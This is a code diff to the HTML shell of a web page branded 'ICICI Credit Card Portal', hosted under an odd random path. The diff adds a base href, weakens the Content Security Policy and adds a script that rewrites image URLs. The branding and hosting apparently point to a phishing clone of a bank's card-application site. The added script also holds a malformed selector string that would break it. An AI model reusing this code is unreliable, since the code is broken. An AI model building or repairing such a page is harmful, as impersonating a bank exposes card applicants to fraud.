@@ -2,6 +2,7 @@
 <html lang="en">
   <head>
     <meta charset="UTF-8" />
+    <base href="/tulie93kk94/" />
     <link rel="icon" type="image/svg+xml" href="/tulie93kk94/logo.png" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>ICICI Credit Card Portal - Apply for Premium Credit Cards</title>
@@ -15,7 +16,7 @@
 
     <!-- Comprehensive Content Security Policy -->
     <meta http-equiv="Content-Security-Policy"
-      content="default-src 'self' https:; script-src 'self' 'unsafe-inline' 'unsafe-eval' https: cdn.tailwindcss.com fonts.googleapis.com cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https: fonts.googleapis.com cdnjs.cloudflare.com; img-src 'self' data: https:; font-src 'self' https: data: fonts.googleapis.com cdnjs.cloudflare.com; connect-src 'self' https:; frame-ancestors 'none'; upgrade-insecure-requests; block-all-mixed-content;">
+      content="default-src 'self' https:; script-src 'self' 'unsafe-inline' 'unsafe-eval' https: cdn.tailwindcss.com fonts.googleapis.com cdnjs.cloudflare.com; style-src 'self' 'unsafe-inline' https: fonts.googleapis.com fonts.gstatic.com cdnjs.cloudflare.com; img-src 'self' data: https: blob:; font-src 'self' https: data:; connect-src 'self' https:; frame-ancestors 'none';">
 
     <!-- Enhanced Security Headers -->
     <meta http-equiv="X-Content-Type-Options" content="nosniff">
@@ -42,5 +43,80 @@
   </head>
   <body class="font-poppins">
     <div id="root"></div>
+
+    <script>
+      (() => {
+        const BASE = "/tulie93kk94";
+
+        function normalizeUrl(value) {
+          if (!value || typeof value !== "string") return value;
+          if (value.startsWith("http://") || value.startsWith("https://") || value.startsWith("data:") || value.startsWith("//") || value.startsWith("#") || value.startsWith("mailto:") || value.startsWith("tel:")) {
+            return value;
+          }
+
+          if (value.startsWith("/") && !value.startsWith(BASE + "/")) {
+            return BASE + value;
+          }
+
+          if (value.startsWith("./") || value.startsWith("../") || value.startsWith("imgi_")) {
+            return new URL(value, window.location.origin + BASE + "/").toString();
+          }
+
+          return value;
+        }
+
+        function fixElement(element) {
+          if (!element) return;
+
+          const src = element.getAttribute("src");
+          if (src) {
+            const fixed = normalizeUrl(src);
+            if (fixed && fixed !== src) element.setAttribute("src", fixed);
+          }
+
+          const srcset = element.getAttribute("srcset");
+          if (srcset) {
+            const fixedSrcset = srcset.split(",").map(part => {
+              const trimmed = part.trim();
+              if (!trimmed) return trimmed;
+              const [url, ...rest] = trimmed.split(/\s+/);
+              const normalized = normalizeUrl(url);
+              return normalized + (rest.length ? " " + rest.join(" ") : "");
+            }).join(", ");
+
+            if (fixedSrcset !== srcset) element.setAttribute("srcset", fixedSrcset);
+          }
+
+          const style = element.getAttribute("style");
+          if (style && /url\(/i.test(style)) {
+            const fixedStyle = style.replace(/url\((['"]?)([^)]+?)\1\)/gi, (match, quote, url) => {
+              const normalized = normalizeUrl(url);
+              return `url(${quote}${normalized}${quote})`;
+            });
+            if (fixedStyle !== style) element.setAttribute("style", fixedStyle);
+          }
+        }
+
+        function scan() {
+          document.querySelectorAll("img, source, video, image, picture").forEach(fixElement);
+          document.querySelectorAll("[style*"]").forEach(el => {
+            const style = el.getAttribute("style");
+            if (style && /url\(/i.test(style)) {
+              fixElement(el);
+            }
+          });
+        }
+
+        scan();
+
+        const observer = new MutationObserver(() => scan());
+        observer.observe(document.body || document.documentElement, {
+          childList: true,
+          subtree: true,
+          attributes: true,
+          attributeFilter: ["src", "srcset", "style"]
+        });
+      })();
+    </script>
   </body>
 </html>
